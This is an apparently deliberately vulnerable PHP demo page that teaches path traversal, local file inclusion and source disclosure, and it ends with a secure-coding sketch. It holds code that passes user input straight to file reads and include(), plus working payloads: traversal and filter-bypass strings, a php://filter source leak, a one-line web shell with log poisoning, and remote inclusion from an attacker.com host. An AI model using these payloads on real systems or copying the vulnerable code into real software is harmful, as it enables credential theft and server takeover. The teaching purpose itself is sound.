<?php
// Sensitive File Exposure / Path Traversal / Local File Inclusion Demo
// File Exposure is a class of bugs where the server hands an attacker a file
// they were never meant to see — source code, config, credentials, logs,
// system files (/etc/passwd), even other users' uploads.
//
// NOTE: this demo does NOT need the database — we never run a query. Including
// database.php would just open a MySQL connection we don't use (and crash the
// page if MySQL is unreachable). The whole point of "file exposure" is the
// FILESYSTEM, not the database.

// -----------------------------------------------------------------------------
// VULNERABLE LOGIC #1 — Path Traversal (read any file on disk)
//
// Intent: "let the user view one of OUR text files in this folder".
// Reality: the filename comes straight from ?file= with no checks, so a
// '../' sequence lets the attacker climb out of the intended directory and
// read ANY file the web server (Apache) has permission to read.
// -----------------------------------------------------------------------------
$file = $_GET['file'] ?? 'login.php';
$path = __DIR__ . '/' . $file;          // BUG: no normalisation, no allowlist

$contents = null;
$read_error = null;
if (is_file($path) && is_readable($path)) {
    $contents = file_get_contents($path);
} else {
    $read_error = "Cannot read: " . $path;
}

// -----------------------------------------------------------------------------
// VULNERABLE LOGIC #2 — Local File Inclusion (LFI)
//
// Even worse than reading: include() / require() will EXECUTE the file as PHP.
// If an attacker can write a file anywhere on the server (an uploaded avatar,
// a log line, /tmp), they can then "include" it and run arbitrary code.
// -----------------------------------------------------------------------------
$included = null;
if (isset($_GET['page'])) {
    ob_start();
    @include __DIR__ . '/' . $_GET['page'];   // BUG: user-controlled include
    $included = ob_get_clean();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Viewer</title>
    <style>
        body  { font-family: sans-serif; max-width: 900px; margin: 2em auto; }
        pre   { background:#111; color:#0f0; padding:10px; overflow:auto; max-height:400px; }
        .debug { background:#f5f5dc; border:1px solid #999; padding:10px; margin-top:20px; font-size:0.9em; }
        .danger { background:#ffe0e0; border:1px solid #c00; padding:10px; margin-top:20px; }
        code { background:#eee; padding:1px 4px; }
    </style>
</head>
<body>

<h2>Internal File Viewer</h2>
<p>Pick a file to view (intended use: read one of our help text files).</p>

<form method="GET">
    <input type="text" name="file" value="<?= htmlspecialchars($file) ?>" size="60">
    <button type="submit">View</button>
</form>

<p>Quick links:
    <a href="?file=login.php">login.php</a> |
    <a href="?file=database.php">database.php</a> |
    <a href="?file=../../../../../etc/passwd">/etc/passwd</a> |
    <a href="?file=../../../../../etc/hosts">/etc/hosts</a>
</p>
<p style="font-size:0.9em;color:#666;">
    Note: this folder is 5 directories deep
    (<code>/Applications/XAMPP/xamppfiles/htdocs/vunerability</code>),
    so reaching <code>/etc/hosts</code> needs at least 5 <code>../</code>
    segments. Extra ones don't hurt — try
    <code>../../../../../../../../etc/passwd</code>
    and it still works.
</p>

<h3>File contents</h3>
<?php if ($contents !== null): ?>
    <pre><?= htmlspecialchars($contents) ?></pre>
<?php else: ?>
    <p><?= htmlspecialchars($read_error) ?></p>
<?php endif; ?>

<?php if ($included !== null): ?>
    <div class="danger">
        <h3>LFI output (?page=...)</h3>
        <pre><?= htmlspecialchars($included) ?></pre>
    </div>
<?php endif; ?>

<div class="debug">
    <strong>DEBUG</strong><br>
    ?file = <code><?= htmlspecialchars($file) ?></code><br>
    Resolved path = <code><?= htmlspecialchars($path) ?></code><br>
    Realpath = <code><?= htmlspecialchars(realpath($path) ?: '(not found)') ?></code>
</div>

</body>
</html>

<?php
/* =============================================================================
   FILE EXPOSURE  —  Path Traversal, LFI, and Source Disclosure
   =============================================================================

   "File exposure" covers any bug where the server hands the attacker a file
   they shouldn't see. Three flavours show up over and over in the wild:

       (a) Source disclosure  — the server returns .php/.env/.config as text
       (b) Path traversal     — attacker climbs out of the intended folder
       (c) Local File Inclusion (LFI) — server EXECUTES an attacker-chosen file

   This page demonstrates all three.

   -----------------------------------------------------------------------------
   EXPLOIT 1 — Source code disclosure
   -----------------------------------------------------------------------------
   Visit:
       file-exposure.php?file=database.php

   Normally hitting /database.php in the browser would EXECUTE the PHP and
   return nothing useful. But here the server reads it as TEXT with
   file_get_contents(), so the raw source — including the MySQL username,
   password, and database name — is dumped to the page.

   Try also:
       ?file=login.php                  -> see the SQL injection logic
       ?file=broken-authorization.php   -> see the auth bypass logic

   Real-world equivalents: backup files left online (database.php.bak,
   wp-config.php~), exposed .git/ directories, exposed .env files in the
   web root.

   -----------------------------------------------------------------------------
   EXPLOIT 2 — Path traversal (../)
   -----------------------------------------------------------------------------
   The base directory is __DIR__ ('this folder'). '../' moves up one level.
   Chain enough of them and you reach the filesystem root, then descend into
   anywhere the Apache process can read:

       ?file=../../../../../etc/passwd
       ?file=../../../../../etc/hosts
       ?file=../../etc/php.ini                          (XAMPP php.ini)
       ?file=../../apache2/conf/httpd.conf              (XAMPP Apache conf)
       ?file=../../../../../var/log/apache2/access_log  (Linux)
       ?file=../../logs/access_log                      (XAMPP relative)

   Counting: this folder is 5 levels under '/', so /etc/passwd needs at
   least 5 '../' segments. Adding more doesn't break the path — extra '../'
   at root "click" back to /. That's why attackers use long traversal
   strings like '../../../../../../../../etc/passwd' to be safe.

   Variations to defeat naive filters:
       ?file=....//....//etc/passwd       (some filters strip only one '../')
       ?file=..%2f..%2f..%2fetc/passwd    (URL-encoded slash)
       ?file=..%252f..%252fetc/passwd     (double URL-encoded)
       ?file=/etc/passwd                  (absolute path — works if no prefix
                                           strip)

   -----------------------------------------------------------------------------
   EXPLOIT 3 — Reading PHP source via a php:// stream wrapper
   -----------------------------------------------------------------------------
   When the vulnerable code uses include() / require() instead of
   file_get_contents(), the file is EXECUTED, so plain ?page=database.php
   shows nothing. PHP's stream wrappers solve that for the attacker:

       ?page=php://filter/convert.base64-encode/resource=database.php

   PHP applies the base64 filter BEFORE include() parses the result, so you
   get the raw source — base64-encoded — printed to the page. Decode it and
   the credentials are yours. This is the classic "LFI to source leak" trick.

   -----------------------------------------------------------------------------
   EXPLOIT 4 — Local File Inclusion to Remote Code Execution
   -----------------------------------------------------------------------------
   If the attacker can plant a file with PHP code anywhere on the server
   (uploaded avatar, log file the server writes their User-Agent to, a temp
   file from a different bug) and then point ?page= at it, the server will
   execute that PHP. Examples:

       1. Upload an "image" called shell.php.jpg whose contents start with
          <?php system($_GET['c']); ?>
          Then: ?page=uploads/shell.php.jpg&c=id

       2. Poison the Apache access log by sending a request with a
          User-Agent of <?php system($_GET['c']); ?>, then:
          ?page=../../logs/access_log&c=whoami

   This is how a "just read a file" bug becomes full server takeover.

   -----------------------------------------------------------------------------
   EXPLOIT 5 — Remote File Inclusion (legacy)
   -----------------------------------------------------------------------------
   If php.ini has allow_url_include=On (off by default since PHP 5.2):

       ?page=http://attacker.com/shell.txt

   Server downloads the URL and executes it as PHP. Game over.

   -----------------------------------------------------------------------------
   WHY THIS CODE IS BROKEN
   -----------------------------------------------------------------------------
   1. User input goes straight into a filesystem path. The string '../' has
      special meaning to the filesystem; the code does not strip or resolve it.
   2. No allowlist of permitted filenames.
   3. No check that the resolved path stays inside the intended directory.
   4. include() is called with user input — the worst possible primitive.
   5. Sensitive files (database.php with credentials, .env, .git/) live in
      the web root where any file-read bug exposes them.

   -----------------------------------------------------------------------------
   SECURE VERSION (sketch)
   -----------------------------------------------------------------------------

       // 1. Allowlist — the safest pattern. Map a token to a real file.
       $allowed = [
           'welcome' => 'help/welcome.txt',
           'faq'     => 'help/faq.txt',
           'terms'   => 'help/terms.txt',
       ];
       $key = $_GET['file'] ?? 'welcome';
       if (!isset($allowed[$key])) {
           http_response_code(400); exit('Unknown file');
       }
       echo htmlspecialchars(file_get_contents(__DIR__ . '/' . $allowed[$key]));

       // 2. If you MUST accept a filename, anchor it:
       $base = realpath(__DIR__ . '/help');
       $path = realpath($base . '/' . $_GET['file']);
       if ($path === false || strpos($path, $base . DIRECTORY_SEPARATOR) !== 0) {
           http_response_code(403); exit('Forbidden');
       }
       // realpath() resolves all '..' and symlinks, then we check the
       // result is still inside $base. This is the canonical defence.

       // 3. NEVER call include() with user input. If you need to load one of
       //    several pages, use a switch/match on the allowlist key.

       // 4. Defence in depth:
       //    - Move secrets (DB creds, API keys) OUT of the web root.
       //    - In Apache, block direct access to .git, .env, *.bak, *.sql.
       //    - Set open_basedir in php.ini so PHP can't escape the project.
       //    - Disable allow_url_include and allow_url_fopen.
============================================================================= */
?>
